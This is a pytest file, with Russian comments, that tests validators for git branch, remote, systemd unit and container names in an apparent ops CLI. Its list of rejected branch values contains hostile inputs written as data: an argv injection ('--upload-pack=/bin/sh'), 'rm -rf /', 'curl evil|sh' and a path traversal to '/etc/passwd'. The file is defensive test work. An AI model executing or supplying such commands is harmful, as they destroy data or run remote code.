import pytest

from hermes_cli.ops_params import (
    OpsParamError,
    validate_branch,
    validate_container,
    validate_remote,
    validate_unit,
)


def test_validate_branch_accepts_an_ordinary_branch_name():
    assert validate_branch("local/customizations") == "local/customizations"


@pytest.mark.parametrize(
    "value",
    [
        "--upload-pack=/bin/sh",   # argv-инъекция: git выполнит произвольную программу
        "-o",                       # любой аргумент, начинающийся с дефиса
        "main; rm -rf /",          # метасимволы shell
        "main && curl evil|sh",
        "../../etc/passwd",        # обход пути
        "feature/..hidden",        # ".." запрещён и правилами refname
        "/leading-slash",
        "trailing-slash/",
        "",
        "   ",
        "a" * 201,                 # длина
        "ветка",                   # не-ASCII
    ],
)
def test_validate_branch_rejects_hostile_values(value):
    with pytest.raises(OpsParamError):
        validate_branch(value)


def test_validate_remote_accepts_only_origin():
    assert validate_remote("origin") == "origin"
    with pytest.raises(OpsParamError):
        validate_remote("https://example.com/evil.git")


def test_validate_unit_accepts_only_allowlisted_units():
    assert validate_unit("job-intel-daily.service") == "job-intel-daily.service"
    with pytest.raises(OpsParamError):
        validate_unit("ssh.service")


def test_validate_container_rejects_ephemeral_sandbox_containers():
    assert validate_container("monitoring-grafana") == "monitoring-grafana"
    # hermes-<hex> контейнеры эфемерны: перезапуск бессмыслен и опасен
    with pytest.raises(OpsParamError):
        validate_container("hermes-15977a64")
